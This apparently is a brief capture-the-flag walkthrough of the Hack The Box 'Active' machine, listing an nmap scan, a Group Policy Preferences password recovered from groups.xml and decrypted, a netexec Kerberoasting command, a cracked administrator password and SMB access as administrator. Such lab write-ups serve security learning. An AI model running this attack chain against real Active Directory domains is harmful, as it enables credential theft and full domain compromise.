53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-11 15:22:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC

in replication smb  . found groups.xml. svc_tgs : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
<img width="864" height="436" alt="image" src="https://github.com/user-attachments/assets/597f5244-a5cf-42d8-aff0-5691fc8329bf" />  
<img width="1907" height="339" alt="image" src="https://github.com/user-attachments/assets/db5df740-9fa7-4629-bbba-8a5372d79894" />

decrypted:  GPPstillStandingStrong2k18
<img width="909" height="77" alt="image" src="https://github.com/user-attachments/assets/4844c01c-f736-4d8e-9891-006c7a2cf46e" />

administrator has spn so is kerberoastable
<img width="967" height="308" alt="image" src="https://github.com/user-attachments/assets/1a4a03cb-6d47-48f1-8bdf-f1b541c5b894" />

netexec ldap $ip -u svc_tgs -p GPPstillStandingStrong2k18 --kerberoast kerberoasting
password is Ticketmaster1968
<img width="1901" height="302" alt="image" src="https://github.com/user-attachments/assets/0818cca2-dee5-4a89-a96f-7e14bceaa8d8" />  

smb in to users using administrator  
<img width="680" height="134" alt="image" src="https://github.com/user-attachments/assets/80a2d1af-c2f5-4494-9e6f-d1eff3019366" />


